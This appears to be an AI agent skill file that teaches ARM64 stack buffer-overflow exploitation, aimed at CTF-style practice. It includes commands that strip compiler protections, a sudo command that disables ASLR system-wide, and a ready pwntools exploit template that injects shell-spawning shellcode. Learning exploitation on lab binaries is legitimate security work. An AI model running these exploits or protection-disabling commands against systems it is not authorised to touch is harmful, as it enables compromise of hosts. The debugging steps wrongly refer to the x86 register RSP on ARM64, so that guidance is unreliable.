---
name: stack-shellcode-arm64
description: Create stack shellcode exploits for ARM64 buffer overflow vulnerabilities. Use this skill whenever the user needs to exploit a stack-based buffer overflow on ARM64 architecture, mentions shellcode injection, stack pivoting, or needs help crafting pwn payloads for ARM64 binaries. This includes finding offsets, generating shellcode, and handling ASLR/NX considerations.
---

# Stack Shellcode Exploitation - ARM64

This skill helps you create stack shellcode exploits for ARM64 architecture buffer overflow vulnerabilities.

## When to Use This Skill

Use this skill when:
- You have a vulnerable ARM64 binary with a buffer overflow
- You need to inject and execute shellcode on the stack
- You're working on CTF challenges or security research involving ARM64 exploitation
- You need help finding the correct offset to overwrite the return address
- You need to craft payloads for ARM64 pwn challenges

## Key Concepts

### ARM64 Stack Shellcode Basics

On ARM64, stack shellcode exploits work by:
1. Overwriting the return address with a pointer to your shellcode on the stack
2. Placing shellcode after the return address in the overflow buffer
3. When the function returns, execution jumps to your shellcode

### Platform Differences

**Linux:**
- Can disable NX with `-z execstack` flag
- Can disable ASLR for testing
- Full stack shellcode exploitation possible

**macOS:**
- NX is hardware-enforced and cannot be disabled
- Stack shellcode exploitation is NOT possible
- Use ret2win or ROP techniques instead

## Exploitation Workflow

### Step 1: Compile the Vulnerable Binary

For testing purposes, compile without protections:

```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```

**Important flags:**
- `-fno-stack-protector`: Disables canary
- `-no-pie`: Disables position-independent executable
- `-z execstack`: Makes stack executable (Linux only)

### Step 2: Disable ASLR (Linux Testing)

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Step 3: Find the Offset

Use the `find-offset-arm64.sh` script or manually with GDB:

```bash
# Generate cyclic pattern
python3 -c "from pwn import *; print(cyclic(256))"

# Run binary with pattern, crash, check RSP in GDB
# Calculate offset from pattern offset
```

### Step 4: Generate Shellcode

```python
from pwn import *
shellcode = asm(shellcraft.sh())
```

### Step 5: Craft the Payload

```python
# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)  # Adjust based on actual stack location

# Payload: padding + return address + shellcode
payload = b'A' * offset + ret_address + shellcode
```

### Step 6: Execute the Exploit

```python
p = process(binary_name)
p.send(payload)
p.interactive()
```

## Common Issues and Solutions

### Stack Address Changes

The stack address may differ between GDB debugging and actual exploitation. If your exploit doesn't work:

1. Generate a core dump: `gdb ./binary ./core`
2. Check the actual shellcode address in the core file
3. Update your `ret_address` accordingly

### Finding the Correct Stack Address

Use this approach:
1. Run the exploit with a placeholder address
2. Generate a core file on crash
3. In GDB: `x/20gx $rsp` to see stack contents
4. Find where your shellcode actually landed
5. Update the exploit with the correct address

### macOS Limitations

On macOS ARM64:
- NX cannot be disabled (hardware-level enforcement)
- Stack shellcode will NOT work
- Use ret2win or ROP chains instead
- See `ret2win-arm64` skill for alternatives

## Scripts Available

- `find-offset-arm64.sh`: Find the buffer overflow offset
- `generate-shellcode-exploit.py`: Generate a complete exploit

## Example Exploit Template

```python
from pwn import *

# Configuration
binary_name = './bof'
offset = 72  # Adjust based on your binary

# Setup
elf = context.binary = ELF(binary_name)
shellcode = asm(shellcraft.sh())

# Start process
p = process(binary_name)

# Find stack address (you may need to adjust this)
# Use GDB to find the actual address where shellcode lands
ret_address = p64(0xfffffffff1a0)  # Replace with actual address

# Craft payload
payload = b'A' * offset + ret_address + shellcode

print(f"Payload length: {len(payload)}")
print(f"Shellcode length: {len(shellcode)}")

# Send and interact
p.send(payload)
p.interactive()
```

## Debugging Tips

1. **Use GDB with pwndbg/gef**: Better ARM64 support
2. **Check registers**: `info registers` to see RSP, PC values
3. **Examine stack**: `x/20gx $rsp` to view stack contents
4. **Core dumps**: Enable with `ulimit -c unlimited`
5. **Pattern offset**: Use `cyclic_find()` to find exact offset

## Security Considerations

- Only use on systems you own or have permission to test
- Modern systems have multiple protections (ASLR, NX, PIE, canaries)
- This technique is primarily for CTF challenges and security research
- Real-world exploitation requires bypassing multiple protections

## References

- ARM64 Assembly basics
- Pwntools documentation
- GDB debugging for ARM64
- Buffer overflow fundamentals
